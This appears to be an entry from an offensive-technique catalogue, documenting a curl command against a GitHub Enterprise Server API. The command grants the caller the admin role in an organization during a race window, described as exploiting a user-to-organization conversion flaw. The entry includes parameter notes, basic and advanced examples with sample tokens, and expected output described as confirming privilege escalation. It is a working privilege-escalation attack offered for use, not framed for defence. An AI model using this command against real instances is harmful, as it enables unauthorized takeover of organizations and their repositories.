---
id: cmd-curl-admin-race-001
data: >-
  curl -X PUT
  https://github.enterprise/api/orgs/target_org/memberships/USER_LOGIN -H
  "Authorization: token USER_TOKEN" -H "Content-Type: application/json" -d
  '{"role": "admin"}'
tags:
  - api
  - github
  - admin
  - race
type: command
output: null
executor: bash
platforms:
  - GitHub Enterprise Server
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:17.970Z'
verified: false
validated: true
submitted: true
---
# curl-race-admin-action

## Command

```bash
curl -X PUT https://github.enterprise/api/orgs/target_org/memberships/USER_LOGIN -H "Authorization: token USER_TOKEN" -H "Content-Type: application/json" -d '{"role": "admin"}'
```

## Description

Asserts admin role on the organization during the race window to exploit the conversion vulnerability in GitHub Enterprise Server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X PUT` | HTTP method for update | Yes |
| `-H "Authorization: token USER_TOKEN"` | Auth header | Yes |
| `-H "Content-Type: application/json"` | JSON type | Yes |
| `-d '{...}'` | Payload setting role to admin | Yes |

## Examples

### Basic Usage

```bash
curl -X PUT https://github.enterprise/api/orgs/test_org/memberships/user1 -H "Authorization: token ghp_abc123" -d '{"role": "admin"}'
```

### Advanced Usage

```bash
curl -X PUT https://github.enterprise/api/orgs/test_org/memberships/user1 -H "Authorization: token ghp_abc123" -d '{"role": "admin", "reason": "Conversion race"}'
```

## Expected Output

JSON like {"role": "admin", "status": "active"}, confirming privilege escalation without auth failure.

## Related

- [[Related Procedure: Exploit-GitHub-User-to-Org-Race-Condition]]
